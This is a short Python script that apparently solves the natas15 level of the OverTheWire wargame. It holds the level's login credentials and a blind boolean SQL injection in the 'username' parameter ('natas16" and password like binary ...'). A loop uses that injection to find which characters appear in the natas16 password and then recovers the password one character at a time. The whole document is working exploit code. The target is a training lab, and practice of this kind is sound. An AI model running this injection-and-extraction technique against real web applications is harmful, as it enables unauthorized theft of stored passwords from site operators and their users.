#!/bin/python

import requests, string, urllib.parse

url = "http://natas15.natas.labs.overthewire.org?"
auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

chars = string.ascii_letters + string.digits 

password_chars = []

params = {
    'username': 'natas16" and password like binary "%C%',
    'debug': 1
}

for char in chars:
    username = list(params['username'])
    username[len(username) - 2] = char
    params['username'] = "".join(username)

    uri = url + urllib.parse.urlencode(params)
    r = requests.get(uri, auth=auth)

    if "This user exists" in r.text:
        password_chars.append(char)

print("Password chars created: ", password_chars)

password = ''
username = 'natas16" and password like binary "'
for _ in range(64):
    for char in password_chars:
        params['username'] = username + password + char + "%"

        uri = url + urllib.parse.urlencode(params)
        r = requests.get(uri, auth=auth)

        if "This user exists" in r.text:
            password += char
            print("Password: " + password)

